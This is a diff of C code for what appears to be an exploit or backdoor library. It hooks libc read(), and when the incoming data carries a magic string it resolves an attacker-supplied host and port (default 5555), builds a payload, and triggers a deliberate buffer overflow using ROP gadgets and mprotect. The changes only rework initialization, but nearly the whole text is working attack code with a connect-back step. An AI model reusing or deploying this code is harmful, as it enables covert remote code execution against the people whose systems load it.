@@ -114,7 +114,6 @@ static Payload payload = {
 
 _Bool initialized = 0;
 
-ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
 Pointer libc_mprotect					= NULL;
 Pointer libc_popRDI					= NULL;
 Pointer libc_popRSI					= NULL;
@@ -153,7 +152,6 @@ static void initialize(void)
 {
 	if (!initialized)
 	{
-		libc_read	= dlsym(RTLD_NEXT, s_libc_read);
 		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);
 		libc_base	= elfBase(libc_mprotect);
 
@@ -165,8 +163,7 @@ static void initialize(void)
 
 		stack_base	= stackPage();
 
- 		// TODO: These globals aren't thread safe so initialize every time.
-		//initialized = 1;
+		initialized = 1;
 	} // if
 
 	return;
@@ -287,13 +284,17 @@ static void overflow(Pointer p, size_t n) {
 	memcpy(buffer, p, n);
 } // overflow()
 
+typedef
+ssize_t Read(int fd, void *buf, size_t count);
 ssize_t read(int fd, void *buf, size_t count) {
-	initialize();
+	Read *libc_read = dlsym(RTLD_NEXT, s_libc_read);
 	ssize_t result = libc_read(fd, buf, count);
 
 	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);
 
 	if (p) {
+		initialize();
+
 		p += strlen(s_magic);
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
@@ -311,11 +312,10 @@ ssize_t read(int fd, void *buf, size_t count) {
 			payload.pl_scu.sc.port = htons((ns > 1) ? port : 5555);
 
 			// See if the s_host string can be parsed by inet_aton()
-			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0) {
+			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0)
 				for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
 					for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
  						payload.pl_scu.sc.ipAddress = *((struct in_addr **) he->h_addr_list)[i];
-			} // if
 
 			// Generate the payload that we will "echo" back
 			unsigned char sPayload64[4096];
